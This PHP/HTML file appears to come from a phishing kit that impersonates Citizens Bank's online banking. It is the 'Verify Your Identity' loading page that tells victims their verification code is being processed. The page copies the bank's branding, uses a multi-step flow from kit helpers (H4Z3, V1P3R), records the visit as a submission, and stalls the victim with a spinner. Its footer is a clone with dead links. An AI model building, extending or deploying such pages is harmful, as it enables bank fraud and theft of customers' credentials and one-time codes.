<?php
require_once __DIR__ . '/settings.php';
require_once __DIR__ . '/H4Z3/functions.php';

$stepKey = 'loading_code';

if (!h4z3_is_step_active($stepKey)) {
    header('Location: ' . h4z3_get_first_step_path());
    exit;
}

$steps = h4z3_get_flow_steps();
$totalSteps = count($steps);
$currentStep = null;

foreach ($steps as $index => $step) {
    if (($step['key'] ?? null) === $stepKey) {
        $currentStep = $index + 1;
        break;
    }
}

if ($currentStep === null) {
    header('Location: ' . h4z3_get_first_step_path());
    exit;
}

h4z3_store_submission('loading_code', []);
?>
<!DOCTYPE html>
<html class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths citizens-Firefox citizens-user-none" lang="en-US">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Online Banking Verification | Citizens Bank</title>
        <link rel="shortcut icon" href="./V1P3R/img/favicon.png" type="image/x-icon">
        <link rel="stylesheet" href="./V1P3R/css/Follow/app.css">
        <link rel="stylesheet" href="./V1P3R/css/Follow/citizensns.css">
        <link rel="stylesheet" href="./V1P3R/css/Follow/sec-3-3.css">
        <style>
            .loading-spinner {
                width: 72px;
                height: 72px;
                border-radius: 50%;
                border: 6px solid #e0e0e0;
                border-top-color: #009d78;
                margin: 0 auto 20px auto;
                animation: loading-spinner-rotate 0.9s linear infinite;
            }

            @keyframes loading-spinner-rotate {
                0% {
                    transform: rotate(0deg);
                }

                100% {
                    transform: rotate(360deg);
                }
            }

            .loading-status {
                display: block;
                font-size: 1.1em;
                color: #003c46;
            }
        </style>
    </head>
    <body class="responsive-enabled">
        <div class="citizens-header">
            <div class="citizens-header-footer">
                <header id="page-header" class="page-header">
                    <div class="centered-content clearfix">
                        <a style="cursor: pointer;" class="page-logo">
                            <img src="./V1P3R/img/CTZ_Green-01.png" alt="Citizens Bank" width="203" height="25">
                        </a>
                    </div>
                </header>
            </div>
        </div>
        <div id="page-container" class="page-container">
            <div class="centered-content clearfix">
                <div class="g-unauth-main-container">
                    <section class="unauth-intro-area">
                        <h2 class="unauth-intro-area__title ">Verify Your Identity</h2>
                        <div>
                            <div class="unauth-intro-area__step">
                                <strong>Step <?php echo $currentStep; ?> of <?php echo $totalSteps; ?>:</strong>
                                <span>Processing Your Verification Code</span>
                            </div>
                            <div class="unauth-intro-area__progress-container">
                                <div class="unauth-intro-area__progress-segment">
<?php for ($position = 1; $position <= $totalSteps; $position++): ?>
                                    <div class="unauth-intro-area__progress-item <?php echo $position <= $currentStep ? '-js-progress-green' : '-js-progress-light-green'; ?>"></div>
<?php endfor; ?>
                                </div>
                            </div>
                        </div>
                        <div class="unauth-intro-area__help">
                            <p class="unauth-intro-area__text">
                                We are finalizing the verification of your security code.
                                <br>
                                This may take a few moments—please keep this window open.
                            </p>
                        </div>
                    </section>
                    <section class="identify-customer-section">
                        <div class="unauth-form__loading-text-container" role="status" aria-live="polite">
                            <div class="loading-spinner" data-loading-spinner></div>
                            <span class="unauth-form__loading-text loading-status" data-loading-status data-base-text="Please wait">Please wait</span>
                        </div>
                    </section>
                </div>
            </div>
        </div>
        <div class="citizens-footer">
            <div class="citizens-header-footer">
                <footer id="page-footer" class="page-footer">
                    <div class="footer-top">
                        <ul>
                            <li>
                                <a style="cursor: pointer;" class="contact" title="Opens Ways to Contact Us Dialog">
                                    <span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
                                </a>
                            </li>
                            <li>
                                <a style="cursor: pointer;" class="locator" title="Opens Branch &amp; ATM Locator Dialog">
                                    <span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
                                </a>
                            </li>
                        </ul>
                    </div>
                    <div class="footer-row clearfix">
                        <ul>
                            <li>
                                <h6>Checking &amp; Savings</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Checking</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Savings</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Money Markets</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Certificates of Deposit (CDs)
                                    <sup>®</sup>
                                </a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">IRAs</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Programs &amp; Services</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Benefits &amp; Features</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Debit Card</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Overdraft Choices
                                    <sup>®</sup>
                                </a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Home Borrowing</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Mortgages</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Home Equity Loans</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Home Equity Lines of Credit</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Determine My Rate</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">My Mortgage Account</a>
                            </li>
                        </ul>
                        <ul>
                            <li>
                                <h6>Students</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Student Loan Options</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Refinancing Student Loans</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">The Student Loan Process</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Undergraduate Students &amp; Parents</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Graduate Students</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Tools &amp; Information</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Banking for Students</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Access My Student Loan</a>
                            </li>
                        </ul>
                        <ul class="last">
                            <li>
                                <h6>Cards</h6>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Credit Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Debit Card</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Travel &amp; Rewards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Business Cards</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Benefits &amp; Features</a>
                            </li>
                            <li>
                                <a  style="cursor: pointer;">Gift Cards</a>
                            </li>
                        </ul>
                    </div>
                </footer>
            </div>
        </div>
        <script src="./V1P3R/js/presence.js"></script>
        <script src="./V1P3R/js/loading.js"></script>
    </body>
</html>
